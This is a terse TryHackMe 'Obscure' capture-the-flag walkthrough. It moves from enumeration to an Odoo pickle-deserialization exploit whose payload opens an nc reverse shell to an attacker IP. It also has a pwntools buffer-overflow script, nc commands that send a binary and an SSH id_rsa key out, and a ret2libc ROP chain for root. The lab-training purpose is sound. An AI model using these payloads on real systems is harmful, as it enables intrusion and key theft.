@@ -1,0 +1,267 @@
+Obscure TryHackMe
+===================
+
+Enumeration:
+
+nmap -sV -sC -v -p- 10.10.112.151 -oN nmap_s.txt
+
+ftp 10.10.112.151
+
+cat notice.txt
+
+strings password
+
+chmod +x password
+
+./password
+
+strings dump.sql | grep “antisoft.thm”
+
+email: admin@antisoft.thm
+
+Password: SecurePassword123!
+
+Go to settings
+sear
+
+searchsploit Odoo 10.0
+
+searchsploit -m 44064.md
+
+cat 44064.md
+
+search “Database Anonymization”:
+
+install…
+
+Go to Settings -> Anonymize database:
+
+After clicking reload the page:
+
+set up Pickle script:
+
+nano 44064.py
+
+import cPickle
+import os
+import base64
+import pickletools
+
+class Exploit(object):
+ def __reduce__(self):
+  return (os.system, (("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.18.34.172 4444 >/tmp/f"),))
+
+with open("exploit.pickle", "wb") as f:
+ cPickle.dump(Exploit(), f, cPickle.HIGHEST_PROTOCOL)
+
+python2.7 44064.py
+
+set listenner:
+
+nc -lvnp 4444
+
+What’s the initial flag?
+
+In your machine:
+
+download ret
+
+nc -l -p 6666 -q 1 > ret
+
+in Reverse_shel:l
+
+cat ret | nc YOUR_MACHINE_IP 6666
+
+script to pwn:
+
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./ret")
+
+context.binary = exe
+
+
+def conn():
+    if args.LOCAL:
+        #r = process([exe.path])
+        r = gdb.debug([exe.path])
+    else:
+        r = remote("addr", 1337)
+
+    return r
+
+
+def main():
+    r = conn()
+    print(r.recv())
+    win = p64(0x400646)
+    payload_rsp = b"A"*136 + win
+    print(payload_rsp)
+    r.sendline(payload_rsp)
+    # good luck pwning :)
+
+    r.interactive()
+
+def payload():
+    win = p64(0x400646)
+    payload_rsp = b"A"*136 + win
+    with open("payload", "wb") as file:
+        file.write(payload_rsp)
+
+if __name__ == "__main__":
+    #main()
+    payload()
+
+In your_machine:
+
+python3 -m http.server
+
+In reverse_shell:
+
+cd /tmp
+
+curl http:// Your_Machine_ip/payload -o payload
+
+After downloading the file run
+
+cat /etc/hosts
+
+nmap scan:
+
+run exploit:
+
+( cat /tmp/payload; cat) | nc 172.17.0.1 4444
+
+What’s the user flag?
+
+Download id_rsa with nc to:
+
+In your pc:
+
+nc -l -p 6666 -q 1 > id_rsa
+
+In reverse shell:
+
+cd .ssh
+
+cat id_rsa | nc YOUR_MACHINE_IP 6666
+
+ssh connection to zeeshan:
+
+chmod 600 id_rsa
+
+ssh -i id_rsa zeeshan@Machine_IP
+
+Privilege Escalation
+
+/exploit_me
+
+Download set a server:
+
+python3 -m http.server
+
+In your Machine:
+
+wget http://MACHINE_IP/exploit_me
+
+ROPgadget — binary exploit_me | grep ‘pop rdi’
+
+libc search:
+
+Explanation: RopChain
+
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./exploit_me")
+#libc = ELF("./libc.so.6")
+libc = ELF("./libc6_2.23-0ubuntu11.2_amd64.so")
+context.binary = exe
+
+rop = ROP(exe)
+pop_rdi = 0x0000000000400653
+ret = rop.find_gadget(["ret"])[0]
+success(f"{hex(pop_rdi)=}")
+success(f"{hex(ret)=}")
+
+main_function = exe.symbols.main
+success(f"{hex(main_function)=}")
+
+puts_plt = exe.plt.puts
+gets_got = exe.got.gets
+puts_got = exe.got.puts
+setuid_got = exe.got.setuid
+success(f"{hex(puts_plt)=}")
+success(f"{hex(gets_got)=}")
+
+def conn():
+    if args.LOCAL:
+        r = process([exe.path])
+        #r = gdb.debug([exe.path])
+    else:
+        user='zeeshan'
+        port=22
+        host='10.10.35.41'
+        file= '/exploit_me'
+        keyfile= 'id_rsa'
+        s = ssh(host=host, user=user, keyfile=keyfile, port=port)
+        r = s.process('/./exploit_me')
+        
+
+    return r
+
+
+def main():
+    r = conn()
+
+    print(r.recv())
+    offset = 40
+
+    #setuid
+    payload2 = b"A" * offset + p64(ret) + p64(pop_rdi) + p64(setuid_got) + p64(puts_plt) + p64(main_function) 
+
+    r.sendline(payload2)
+    setuid_libc = u64(r.recvline().strip().ljust( 8 , b"\x00"))
+    success(f"{hex(setuid_libc)=}")
+    
+    r.recv()
+    
+    #puts
+    payload1 = b"A" * offset + p64(ret) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_function) 
+
+    r.sendline(payload1)
+    puts_libc = u64(r.recvline().strip().ljust( 8 , b"\x00"))
+    success(f"{hex(puts_libc)=}")
+
+    r.recv()
+    #gets
+    payload = b"A" * offset + p64(ret) + p64(pop_rdi) + p64(gets_got) + p64(puts_plt) + p64(main_function) 
+
+    r.sendline(payload)
+    gets_libc = u64(r.recvline().strip().ljust( 8 , b"\x00"))
+    success(f"{hex(gets_libc)=}")
+
+  
+    
+   # Base libc
+    libc_base = gets_libc - libc.symbols.gets
+    success(f"{hex(libc_base)=}")
+
+    libc.address = libc_base
+
+    # get shell
+    payload_ex = b"A" * offset + p64(ret) + p64(pop_rdi) + p64(gets_libc + 0x11e0c7) + p64(ret) + p64(gets_libc - 0x299f0)
+    r.sendline(payload_ex)
+
+
+    # good luck pwning :)
+
+    r.interactive()
+
+
+if __name__ == "__main__":
+    main()
+
